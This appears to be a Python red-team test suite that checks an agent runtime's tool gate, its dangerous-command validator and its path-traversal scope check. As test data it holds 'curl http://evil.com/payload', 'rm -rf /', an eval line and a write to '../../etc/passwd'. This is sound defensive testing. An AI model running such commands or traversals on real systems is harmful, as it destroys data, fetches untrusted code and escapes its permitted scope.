from __future__ import annotations

"""Red-team diagnostic suite: 3 security boundary checks."""


def test_toolgate_default_deny(context: dict) -> tuple[str, dict, dict]:
    """ToolGate denies operations without a bound lease."""
    try:
        from runtime.gate.toolgate import ToolGate

        gate = ToolGate()

        # Without a lease, everything should be denied
        decision = gate.request_capability("FILESYSTEM_READ", "/tmp/test")

        if decision.allowed:
            return "failed", {}, {
                "reason": "ToolGate allowed operation without a lease",
            }

        return "passed", {}, {
            "decision": {
                "allowed": decision.allowed,
                "reason": decision.reason,
            },
        }
    except Exception as exc:
        return "error", {}, {"error": str(exc)}


def test_validator_rejects_dangerous(context: dict) -> tuple[str, dict, dict]:
    """Validator rejects proposals with dangerous patterns."""
    try:
        from runtime.validation.validator import NON_DETERMINISTIC_PATTERNS
        import re

        # Test that dangerous commands are matched by the patterns
        dangerous_commands = [
            "curl http://evil.com/payload",
            "bash -c 'rm -rf /'",
            "eval $SOME_VAR",
            "python -c 'print(1)'",
        ]

        all_caught = True
        results: list[dict] = []

        for cmd in dangerous_commands:
            caught = any(
                re.search(pat, cmd, re.IGNORECASE)
                for pat in NON_DETERMINISTIC_PATTERNS
            )
            results.append({"command": cmd, "caught": caught})
            if not caught:
                all_caught = False

        if not all_caught:
            return "failed", {}, {
                "reason": "Some dangerous patterns were not caught",
                "results": results,
            }

        return "passed", {"patterns_tested": len(dangerous_commands)}, {
            "results": results,
        }
    except Exception as exc:
        return "error", {}, {"error": str(exc)}


def test_scope_blocks_traversal(context: dict) -> tuple[str, dict, dict]:
    """Scope containment blocks path traversal."""
    try:
        from runtime.validation.validator import _check_scope_containment

        # Create a proposal with a path traversal attempt
        proposal = {
            "scope_boundary": {
                "allowed_paths": ["/workspace/project"],
                "denied_paths": [],
            },
            "modifications": [
                {"path": "/workspace/project/../../etc/passwd", "type": "write"},
            ],
        }

        result = _check_scope_containment(proposal)

        if result["passed"]:
            return "failed", {}, {
                "reason": "Scope containment allowed path traversal",
            }

        return "passed", {}, {
            "check_result": result,
        }
    except Exception as exc:
        return "error", {}, {"error": str(exc)}
